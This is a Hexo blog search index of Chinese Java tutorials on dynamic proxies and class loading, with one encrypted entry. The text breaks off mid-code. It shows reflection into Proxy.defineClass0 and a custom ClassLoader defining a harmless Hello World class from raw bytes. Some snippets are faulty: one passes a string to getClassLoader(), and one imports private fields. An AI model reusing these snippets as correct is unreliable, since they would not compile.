<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Instrument</title>
      <link href="/p/73e26a0d.html"/>
      <url>/p/73e26a0d.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="92ab093b9fc0b167eac7ed63f5386f5f56ff5a661df825a1df94f945e039110a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java动态代理</title>
      <link href="/p/abd111cb.html"/>
      <url>/p/abd111cb.html</url>
      
        <content type="html"><![CDATA[<p>代理是Java中的一种设计模式，通过代理对象访问目标对象。</p><p>代理方式有三种：静态代理，动态代理，CGLib代理。</p><h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><p>使用静态代理由于代理对象要实现与目标对象一致的接口，从而产生过多的代理类。动态代理和静态代理的区别在于，通过动态代理可以实现多个需求。动态代理通过<code>Proxy</code>类创建代理对象，将接口方法代理给<code>InvocationHandler</code>接口完成。</p><h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Subject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">action</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//被代理类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSubject</span> <span class="keyword">implements</span> <span class="title">Subject</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">action</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是被代理类&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">    Object obj;<span class="comment">//实现了接口的被代理类的对象的声明</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.给被代理类的对象实例化2.返回一个代理类的对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">blind</span><span class="params">(Object obj)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.obj = obj;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(obj.getClass().getClassLoader(), obj.getClass().getInterfaces(), <span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//当通过代理类的对象发起对被重写的方法的调用时，都会转换为对如下的invoke方法的调用。</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="comment">//method方法的返回值是returnVal</span></span><br><span class="line">        Object returnVal = method.invoke(obj, args);</span><br><span class="line">        <span class="keyword">return</span> returnVal ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestProxy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//1.被代理类的对象</span></span><br><span class="line">        RealSubject real = <span class="keyword">new</span> RealSubject();</span><br><span class="line">        <span class="comment">//2.创建一个实现了InvocationHandler接口的类的对象</span></span><br><span class="line">        MyInvocationHandler handler = <span class="keyword">new</span> MyInvocationHandler();</span><br><span class="line">        <span class="comment">//3.调用blind()方法，动态的返回一个同样实现了real所在类实现的接口Subject的代理类的对象。</span></span><br><span class="line">        Object obj = handler.blind(real);</span><br><span class="line">        Subject sub = (Subject) obj;<span class="comment">//此时的sub就是代理类的对象</span></span><br><span class="line">        sub.action();<span class="comment">//转到对InvocationHandler接口的实现类的invoke方法调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Proxy类"><a href="#Proxy类" class="headerlink" title="Proxy类"></a>Proxy类</h1><p><code>java.lang.reflect.Proxy</code>类生成动态代理类<code>Class</code></p><h2 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h2><h3 id="getInvocationHandler"><a href="#getInvocationHandler" class="headerlink" title="getInvocationHandler"></a>getInvocationHandler</h3><p><strong>获取动态代理处理类对象，返回所关联的调用程序</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InvocationHandler <span class="title">getInvocationHandler</span><span class="params">(Object proxy)</span> <span class="keyword">throws</span> IllegalArgumentException</span>&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>@param proxy</code> 返回调用处理程序的代理实例<br><code>@return</code> 代理实例的调用处理程序<br><code>@throws IllegalArgumentException</code> 如果参数不是一个代理实例</p></blockquote><h3 id="newProxyInstance"><a href="#newProxyInstance" class="headerlink" title="newProxyInstance"></a>newProxyInstance</h3><p><strong>创建动态代理类实例，返回代理类对象</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span><span class="keyword">throws</span> IllegalArgumentException </span>&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>@param loader</code>     指定动态代理类的类加载器</p><p><code>@param interfaces</code> 指定动态代理类的类需要实现的接口数组(接口列表)，代理类可调用接口中声明的所有方法</p><p><code>@param h</code>          动态代理处理类，<code>InvocationHandler</code>对象</p><p><code>@return</code> 返回动态代理生成的代理类实例</p><p><code>@throws IllegalArgumentException</code> 不正确的参数异常</p></blockquote><h3 id="getProxyClass"><a href="#getProxyClass" class="headerlink" title="getProxyClass"></a>getProxyClass</h3><p><strong>创建动态代理类，返回指定接口的代理类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces)&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>@param loader</code>     定义代理类的类加载器<br><code>@param interfaces</code> 代理类要实现的接口列表<br><code>@return</code> 用指定的类加载器定义的代理类，它可以实现指定的接口</p></blockquote><h3 id="isProxyClass"><a href="#isProxyClass" class="headerlink" title="isProxyClass"></a>isProxyClass</h3><p><strong>检测某个类是否是动态代理类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isProxyClass</span><span class="params">(Class&lt;?&gt; cl)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>@param cl</code> 要测试的类<br><code>@return</code> 如该类为代理类，则为 true，否则为 false</p></blockquote><h3 id="native"><a href="#native" class="headerlink" title="native"></a>native</h3><p><strong>向指定的类加载器中定义一个类对象</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static native Class defineClass0(ClassLoader loader, String name, byte[] b, int off, int len);</span><br></pre></td></tr></table></figure><blockquote><p><code>@param loader</code> 类加载器<br><code>@param name</code>   类名<br><code>@param b</code>      类字节码<br><code>@param off</code>    截取开始位置<br><code>@param len</code>    截取长度<br><code>@return JVM</code>创建的类Class对象</p></blockquote><h1 id="InvocationHandler-接口"><a href="#InvocationHandler-接口" class="headerlink" title="InvocationHandler 接口"></a>InvocationHandler 接口</h1><h2 id="invoke方法"><a href="#invoke方法" class="headerlink" title="invoke方法"></a><code>invoke</code>方法</h2><p>每个代理实例都具有一个关联的调用处理程序。对代理实例调用方法时，将对方法调用进行编码并将其指派到它的调用处理程序的 <code>invoke</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="java-lang-reflect-Proxy-native方法动态创建类对象"><a href="#java-lang-reflect-Proxy-native方法动态创建类对象" class="headerlink" title="java.lang.reflect.Proxy native方法动态创建类对象"></a><code>java.lang.reflect.Proxy</code> <code>native</code>方法动态创建类对象</h1><p><code>java.lang.reflect.Proxy</code>类<code>defineClass0</code>方法动态的向<code>JVM</code>创建一个类对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.drop.test.TestClassLoader.testClassBytes;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.drop.test.TestClassLoader.testClassName;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyDefineClassTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取系统的类加载器，可以根据具体情况换成一个存在的类加载器</span></span><br><span class="line">        ClassLoader classLoader = ClassLoader.getSystemClassLoader();<span class="comment">//返回系统类加载器</span></span><br><span class="line">        <span class="comment">//反射java.lang.reflect.Proxy类获取其中的defineClass0方法</span></span><br><span class="line">        Method method = Proxy.class.getDeclaredMethod(<span class="string">&quot;defineClass0&quot;</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                ClassLoader.class, String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//修改方法的访问权限</span></span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//反射调用java.lang.reflect.Proxy.defineClass0()方法，动态向JVM注册</span></span><br><span class="line">        <span class="comment">//  Class helloWorldClass = (Class) method.invoke() //类型转化</span></span><br><span class="line">        Object helloWorld = method.invoke(<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;</span><br><span class="line">                classLoader, testClassName,testClassBytes, <span class="number">0</span>,testClassBytes.length&#125;);</span><br><span class="line">        <span class="comment">// 输出TestHelloWorld类对象</span></span><br><span class="line">        System.out.println(helloWorld);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="创建代理类实例"><a href="#创建代理类实例" class="headerlink" title="创建代理类实例"></a>创建代理类实例</h1><h2 id="Proxy-newProxyInstance"><a href="#Proxy-newProxyInstance" class="headerlink" title="Proxy.newProxyInstance"></a>Proxy.newProxyInstance</h2><h2 id="Proxy-getProxyClass"><a href="#Proxy-getProxyClass" class="headerlink" title="Proxy.getProxyClass"></a>Proxy.getProxyClass</h2><p>使用<code>Proxy.getProxyClass()</code>获取代理类对象再反射的方式来创建</p><h1 id="CGLib代理"><a href="#CGLib代理" class="headerlink" title="CGLib代理"></a>CGLib代理</h1><p>CGLib是一个第三方代码生成类库，运行时在<strong>内存</strong>动态生成一个子类对象。CGLib基于ASM机制实现，通过生成业务类的子类作为代理。</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java类加载机制</title>
      <link href="/p/6d27f500.html"/>
      <url>/p/6d27f500.html</url>
      
        <content type="html"><![CDATA[<p>Java程序在运行前需要先编译成<code>class文件</code>，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的native方法（<code>defineClass0/1/2</code>）来定义一个<code>java.lang.Class</code>实例。</p><h1 id="class文件"><a href="#class文件" class="headerlink" title="class文件"></a>class文件</h1><p>Java字节码类文件（.class）是Java编译器编译Java源文件（.java）产生的“目标文件”。它是一种8位字节的二进制流文件。</p><h1 id="ClassLoader类加载机制"><a href="#ClassLoader类加载机制" class="headerlink" title="ClassLoader类加载机制"></a>ClassLoader类加载机制</h1><p>主要作用：Java类文件的加载进内存</p><p>Bootstrap ClassLoader（引导类加载器）</p><p>Extension ClassLoader（扩展类加载器）</p><p>App ClassLoader（系统类加载器）—默认的类加载器</p><blockquote><p><code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是AppClassLoader，见示例。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test5</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">        ClassLoader loader1 = ClassLoader.getSystemClassLoader();</span><br><span class="line">        System.out.println(loader1);</span><br><span class="line">        ClassLoader loader2 = loader1.getParent();</span><br><span class="line">        System.out.println(loader2);</span><br><span class="line">        ClassLoader loader3 = loader2.getParent();</span><br><span class="line">        System.out.println(loader3);</span><br><span class="line">        String className = <span class="string">&quot;java.io.File&quot;</span>;</span><br><span class="line">        Class clazz2 = Class.forName(className);</span><br><span class="line">        ClassLoader loader4 = clazz2.getClassLoader();</span><br><span class="line">        System.out.println(loader4);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过引导类加载器加载（该类加载器实现于JVM层，采用C++编写）,获取一个类的类加载器时候会返回一个<code>null</code>值，如<code>loader3</code></p><p><code>java.io.File</code>类同理间<code>loader4</code></p></blockquote><h2 id="ClassLoader类"><a href="#ClassLoader类" class="headerlink" title="ClassLoader类"></a>ClassLoader类</h2><p>抽象类，主要功能：通过指定的类名称，找到或生成对应的字节码，返回<code>java.lang.Class</code>类的实例。</p><p><code>ClassLoader</code>类有如下和加载类相关的方法：</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td><code>getParent()</code></td><td>返回该类加载器的父类加载器</td></tr><tr><td><code>loadClass(String name)</code></td><td>加载指定的Java类</td></tr><tr><td><code>findClass(String name)</code></td><td>查找指定的Java类</td></tr><tr><td><code>findLoadedClass(String name)</code></td><td>查找JVM已经加载过的类</td></tr><tr><td><code>defineClass(String name,byte[] b,int off,int len)</code></td><td>字节数组b转成Java类</td></tr><tr><td><code>resolveClass</code></td><td>链接指定的Java类</td></tr></tbody></table><h2 id="ClassLoader作用"><a href="#ClassLoader作用" class="headerlink" title="ClassLoader作用"></a>ClassLoader作用</h2><p>根据文件地址获取输入流</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ClassLoader loader = <span class="keyword">this</span>.getClass().getClassLoader();</span><br><span class="line">        InputStream is = loader.getResourceAsStream(<span class="string">&quot;com\\drop\\test\\jdbc.properties&quot;</span>);</span><br><span class="line">        Properties pros = <span class="keyword">new</span> Properties();</span><br><span class="line">        pros.load(is);</span><br><span class="line">        String name = pros.getProperty(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        System.out.println(name);</span><br></pre></td></tr></table></figure><h2 id="Java类动态加载机制"><a href="#Java类动态加载机制" class="headerlink" title="Java类动态加载机制"></a>Java类动态加载机制</h2><p>显式：通常使用<code>Java反射</code>或者<code>ClassLoader</code>来动态加载一个类对象。</p><p>隐式：<code>类名.方法名()</code>或<code>new</code>类实例</p><p><strong>常用的类动态加载方式：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//默认会初始化被加载类的静态属性和方法</span></span><br><span class="line">Class clazz2 = Class.forName(<span class="string">&quot;java.io.File&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//默认不会初始化类方法</span></span><br><span class="line">ClassLoader classLoader = <span class="keyword">this</span>.getClass().getClassLoader(<span class="string">&quot;java.io.File&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h2><p>自己的类加载器来实现加载自定义的字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drop.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span></span>&#123;</span><br><span class="line">    <span class="comment">// TestHelloWorld类名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String testClassName = <span class="string">&quot;com.drop.test.TestHelloWorld&quot;</span>;</span><br><span class="line">    <span class="comment">// TestHelloWorld类字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">100</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">112</span>, <span class="number">47</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123; <span class="comment">//使用自定义类加载器重写findClass方法</span></span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用defineClass方法的时候传入TestHelloWorld类的字节码的方式来向JVM中定义一个TestHelloWorld类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception 